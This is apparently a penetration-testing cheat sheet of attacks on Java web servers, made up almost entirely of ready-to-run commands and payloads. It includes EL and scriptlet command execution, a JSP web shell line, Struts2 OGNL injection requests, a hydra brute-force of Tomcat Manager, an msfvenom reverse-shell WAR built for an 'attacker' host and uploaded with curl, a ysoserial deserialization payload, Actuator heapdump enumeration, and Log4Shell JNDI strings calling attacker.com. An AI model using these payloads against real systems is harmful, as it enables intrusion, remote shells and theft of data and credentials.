# JSP/Servlet Vulnerabilities

## 1. JSP Expression Language (EL) Injection
```jsp
${7*7}                    // 49
${"".getClass()}          // java.lang.String
${"".getClass().forName("java.lang.Runtime").getRuntime().exec("id")}
```

## 2. JSP Scriptlet RCE
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
<% Process p = Runtime.getRuntime().exec("id"); %>
```

## 3. Struts2 OGNL Injection
```bash
# S2-045
curl -sk "http://target/" -H "Content-Type: %{(#_='multipart/form-data')..."
# S2-046
# S2-048
# S2-057
```

## 4. Tomcat Manager Brute Force
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-get /manager/html
```

## 5. Tomcat WAR Upload
```bash
# Generate WAR with msfvenom
msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker LPORT=4444 -f war -o shell.war
# Deploy via Manager
curl -u admin:password -X PUT "http://target/manager/text/deploy?path=/shell" --data-binary @shell.war
```

## 6. Apache Struts2 S2-048
```bash
# RCE via Struts showcase
curl -sk "http://target/integration/saveGang498.action" -d "skillName=%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...}"
```

## 7. Deserialization via Java Session
```bash
# If Java session cookie is serialized
# Use ysoserial to generate payload
java -jar ysoserial.jar CommonsCollections1 "id" | base64
```

## 8. Spring Boot Actuator
```bash
curl -sk "http://target/actuator"
curl -sk "http://target/actuator/env"
curl -sk "http://target/actuator/configprops"
curl -sk "http://target/actuator/heapdump"
curl -sk "http://target/actuator/mappings"
curl -sk "http://target/actuator/jolokia"
```

## 9. JNDI Injection
```bash
# Log4Shell related
${jndi:ldap://attacker.com/a}
${jndi:rmi://attacker.com/a}
```

## 10. ClassLoader Manipulation
```bash
# Via Spring Framework
# Manipulate class.module.classLoader
```

## Detection
```bash
curl -sk "http://target/" -I | grep -i "server: Apache-Coyote\|X-Powered-By: Servlet"
curl -sk "http://target/manager/html"
curl -sk "http://target/actuator"
```
